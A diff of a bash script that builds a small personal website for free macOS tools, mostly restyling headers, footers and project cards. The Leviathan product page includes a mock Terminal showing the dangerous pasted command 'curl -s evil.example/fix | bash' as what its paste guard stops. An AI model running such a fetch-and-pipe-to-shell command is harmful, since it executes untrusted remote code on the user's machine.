@@ -1,23 +1,25 @@
 #!/bin/bash
 # Builds the three pages from shared header and footer.
 cd "$(dirname "$0")"
-H='<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,300..600,0..100,0..1&family=Courier+Prime:ital,wght@0,400;0,700;1,400&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/style.css?v=9">'
-TOP='<div class="wrap"><header class="top"><a class="name" href="/">Reed Ostrov</a><span class="motto">small, honest tools for the Mac</span><a class="mute mono" href="https://github.com/Questboy23">github &#8599;</a></header>'
-FOOT='<footer><span>Reed Ostrov &middot; made in Ohio</span><span>free &amp; open source &middot; macOS</span></footer></div></body></html>'
+H='<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,300..600,0..100,0..1&family=Courier+Prime:ital,wght@0,400;0,700;1,400&family=Caveat:wght@500;700&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/style.css?v=11">'
+TOP='<div class="wrap"><div class="sheet"><header class="top"><a class="name" href="/">Reed Ostrov<svg class="squig" viewBox="0 0 200 12" preserveAspectRatio="none" aria-hidden="true"><path d="M2 7c14-6 22 5 36 0s22-6 36 0 22 5 36 0 22-6 36 0 22 5 36 0 14-4 16-2"/></svg></a><span class="pen hi">welcome to my little corner of the internet :)</span><a class="gh" href="https://github.com/Questboy23">github &#8599;</a><svg class="sun" viewBox="0 0 64 64" aria-hidden="true"><circle cx="32" cy="32" r="11"/><path d="M32 6v9M32 49v9M6 32h9M49 32h9M13.6 13.6l6.4 6.4M44 44l6.4 6.4M13.6 50.4 20 44M44 20l6.4-6.4"/></svg></header>'
+UPDATED=$(date '+%B %-d, %Y')
+FOOT='<footer><p class="pen bye">thanks for stopping by! &#9786;</p><p class="small">made by hand in Ohio &middot; free &amp; open source &middot; last updated '"$UPDATED"' &middot; <a href="#">back to top &uarr;</a></p></footer></div></div></body></html>'
 
 cat > index.html <<EOF
 $H<title>Reed Ostrov</title><meta name="description" content="Reed Ostrov's projects: free, open source tools for the Mac."></head><body>$TOP
-<main class="home"><h1 class="label">Projects</h1><div class="grid">
-<a class="card glass lev" href="/leviathan/"><span class="icon lev"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3zm-1.2 14.2-3.5-3.5 1.4-1.4 2.1 2.1 4.9-4.9 1.4 1.4-6.3 6.3z"/></svg></span><h2>Leviathan</h2><p>Stops malware on your Mac before it runs.</p><span class="pill">Learn more &rarr;</span></a>
+<main class="home"><section class="intro"><p class="hello serif">Hi, I&rsquo;m Reed.</p><p>I make <mark>small, free tools for the Mac</mark>. Each one does one job, explains itself in plain words, and asks for nothing back. Here&rsquo;s what&rsquo;s on the shelf so far.</p></section>
+<h1 class="label"><span>things I&rsquo;ve made</span><span class="pen arrow" aria-hidden="true">&darr;</span></h1><div class="grid">
+<a class="card glass lev" href="/leviathan/"><span class="icon lev"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3zm-1.2 14.2-3.5-3.5 1.4-1.4 2.1 2.1 4.9-4.9 1.4 1.4-6.3 6.3z"/></svg></span><span class="sticker s-blue" aria-hidden="true">v2.0</span><h2>Leviathan</h2><p>Stops malware on your Mac before it runs.</p><span class="pill">Learn more &rarr;</span></a>
 <a class="card glass am" href="/activity-monitored/"><span class="icon am"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 4a10 10 0 0 0-10 10c0 1.7.4 3.3 1.2 4.7l1.7-1A8 8 0 1 1 20 14c0 1.4-.4 2.7-1 3.8l1.7 1A10 10 0 0 0 12 4zm4.2 4.4-5.6 4.4a2 2 0 1 0 2.8 2.8l2.8-7.2z"/></svg></span><h2>Activity Monitored</h2><p>Keeps your Mac fast when it is overloaded.</p><span class="pill">Learn more &rarr;</span></a>
-<a class="card glass" href="/voice-computer-agent/"><span class="icon" style="background:#2f9e57"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.9V21h2v-3.1a7 7 0 0 0 6-6.9h-2z"/></svg></span><h2>Voice Computer Agent</h2><p>Tell your Mac what to do, and it does it.</p><span class="pill">Learn more &rarr;</span></a>
-<div class="card stub" aria-hidden="true"><span class="serif">More on the workbench&hellip;</span></div>
+<a class="card glass" href="/voice-computer-agent/"><span class="icon" style="background:#2f9e57"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.9V21h2v-3.1a7 7 0 0 0 6-6.9h-2z"/></svg></span><span class="sticker s-yellow" aria-hidden="true">early build!</span><h2>Voice Computer Agent</h2><p>Tell your Mac what to do, and it does it.</p><span class="pill">Learn more &rarr;</span></a>
+<div class="card stub" aria-hidden="true"><span class="pen">more on the way&hellip; &#9733;</span></div>
 </div></main>$FOOT
 EOF
 
 cat > leviathan/index.html <<EOF
 $H<title>Leviathan</title><meta name="description" content="Leviathan protects a Mac from malware sites, harmful downloads and dangerous pasted commands."></head><body>$TOP
-<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
+<nav class="crumb"><a class="back pen" href="/"><span aria-hidden="true">&larr;</span> back to all projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--sea)"></i>Project 01 &middot; macOS &middot; v2.0</div><h1 class="serif" style="margin-top:16px">Leviathan</h1><p class="lede serif">It stops malware on your Mac before the malware can run.</p>
 <div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div></div>
 <figure class="win" aria-label="Example of the paste guard"><div class="bar"><i></i><i></i><i></i><span>Terminal</span></div><pre class="scr"><span class="dim">$</span> curl -s evil.example/fix | bash
@@ -52,7 +54,7 @@ EOF
 
 cat > activity-monitored/index.html <<EOF
 $H<title>Activity Monitored</title><meta name="description" content="Activity Monitored keeps a Mac responsive when it is overloaded."></head><body>$TOP
-<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
+<nav class="crumb"><a class="back pen" href="/"><span aria-hidden="true">&larr;</span> back to all projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--mustard)"></i>Project 02 &middot; macOS</div><h1 class="serif" style="margin-top:16px">Activity Monitored</h1><p class="lede serif">Keeps your Mac quick when too much is running at once.</p>
 <div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div></div>
 <figure class="win" aria-label="Example of Activity Monitored at work"><div class="bar"><i></i><i></i><i></i><span>Activity Monitored</span></div><pre class="scr">Processor  <span class="meter"><i style="width:96%"></i></span> 96%
@@ -88,7 +90,7 @@ EOF
 mkdir -p voice-computer-agent
 cat > voice-computer-agent/index.html <<EOF
 $H<title>Voice Computer Agent</title><meta name="description" content="Tell your Mac what to do. Voice Computer Agent does it on screen while you watch, or in the background while you sleep, inside hard limits you set."><style>.vt{width:100%;border-collapse:collapse;font-size:15px}.vt th,.vt td{text-align:left;padding:10px 8px;border-bottom:1px solid rgba(128,128,128,.25);vertical-align:top}.vt th{font-weight:600}.dia{width:100%;height:auto;display:block;margin-top:8px}.dia text{font:13px "Instrument Sans",sans-serif;fill:currentColor}.dia .s{font-size:11px;opacity:.75}.dia rect{fill:none;stroke:currentColor;stroke-opacity:.45;rx:10}.dia .g{stroke:#3fbf6a;stroke-opacity:.9}.dia path{stroke:currentColor;stroke-opacity:.5;fill:none;marker-end:url(#ar)}pre{overflow-x:auto}</style></head><body>$TOP
-<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
+<nav class="crumb"><a class="back pen" href="/"><span aria-hidden="true">&larr;</span> back to all projects</a></nav>
 <section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:#3fbf6a"></i>Project 03 &middot; macOS &middot; early test build</div><h1 class="serif" style="margin-top:16px">Voice Computer Agent</h1><p class="lede serif">Tell your Mac what to do. It does it on screen while you watch, or in the background while you sleep.</p>
 <div class="actions"><a class="btn" href="/voice-computer-agent/VoiceComputerAgent.zip" download>Download for Mac <span aria-hidden="true">&darr;</span></a></div><p class="note">Early test build for macOS on Apple silicon. Free mode is still weak; Claude mode works best.</p></div>
 <figure class="win" aria-label="Example of the agent at work"><div class="bar"><i></i><i></i><i></i><span>Voice Computer Agent</span></div><pre class="scr"><span class="dim">You (holding Right Option):</span> get me to my Chrome extensions
